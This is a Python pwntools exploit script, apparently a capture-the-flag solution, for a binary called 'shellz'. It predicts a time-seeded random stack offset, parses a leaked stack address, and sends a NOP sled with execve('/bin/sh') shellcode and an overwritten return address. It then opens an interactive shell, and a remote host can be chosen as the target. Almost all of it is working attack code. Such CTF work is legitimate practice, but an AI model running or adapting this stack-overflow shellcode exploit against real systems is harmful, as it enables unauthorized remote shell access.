from pwn import *
import re, time, random
from ctypes import CDLL, c_uint, c_int, byref


PROGRAM_PATH = (Path(__file__).parent / "shellz").resolve().__str__()
BUFF_SIZE = 8192 + 8  # 0x2000
# BUFF_SIZE = 0x88
# CANARY = 123456789
# This shell code is 23 bytes
# Run /bin/sh
SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

PAYLOAD_SIZE = len(SHELL_CODE)
WRAP_AROUND = 500

gdb_script = """
b *vuln+62
b *vuln+104
b *vuln+138
c
"""

gdb_script2 = """
b *vuln+62
b *vuln+189
c
"""

# gdb_script = """
# b *main
# b *vuln
# b *vuln+104
# c
# """


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")

# Random seed
# TODO: We are 1 second off! CHECK

libc = CDLL("libc.so.6")  # glibc on Linux
libc.srand.argtypes = [c_uint]
libc.rand.restype = c_int
libc.rand_r.argtypes = [
    c_uint.__class__,
]  # see rand_r example below

seed = math.trunc(time.time()) + 1
print(f"Time now is: {seed}")
print(f"Time now is: {hex(seed)}")
# Basic (global-state) rand/srand — same semantics as C
libc.srand(seed)
x = libc.rand()  # first C rand()
print(f"Random seeded with timeNow is: {x}")
print(f"Random seeded with timeNow is: {hex(x)}")

offset = x % 500
print(f"offset R is: {offset}")
print(f"offset R is: {hex(offset)}")
byte_align = 16 - (offset % 16)
print(f"offset R mod 16 is: {offset % 16}")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script2, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims=":")
print("____________________________________")


print("____________________________________")
print(res)

print("____________________________________")
# Get the stack address
res = io.recvlinesS(1)
# print(res)
match = re.search(r"0x[0-9a-fA-F]+", res[0])
stck_addr = match.group(0)
print(f"stack address received: {stck_addr}")

int_stack_addr = int(stck_addr, 16)
print(f"stack address in int: {int_stack_addr}")

int_buffer_addr = int_stack_addr - offset
buffer_addr = hex(int_buffer_addr)
print(f"buffer address in int: {int_buffer_addr}")
print(f"buffer address hex: {buffer_addr}")


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
MODULO = 500
NOP_SLED_SIZE = 532  # 16 byte aligned!
NOP_SIZE = NOP_SLED_SIZE + byte_align + 5
# Byte align the shellcode
NOP = b"\x90"
payload = (
    NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
    + SHELL_CODE
    + NOP * (NOP_SIZE)
    + p64(int_stack_addr, endianness="little")
)

# TODO: WHY DOES THIS NOT WORK
# payload = (
#     NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
#     + NOP * (NOP_SIZE)
#     + SHELL_CODE
#     + p64(int_stack_addr, endianness="little")
# )

# print(f"Payload is: {payload}")
print(f"Payload len is: {len(payload)}")
print(f"Payload len is: {(BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)}")


# 0x7ffcac397d6a

# imul = 0x10624DD3
# shr = 0x20  # 32
# sar = 0x5
# sar2 = 0x1F  # 31
# imul2 = 0x1F4  # 500


# io.sendline(payload)
print("____________________________________")
print(f"Sending payload with shellcode")
io.sendline(payload)
# res = io.recvlines(1)
# print(res)
io.interactive()
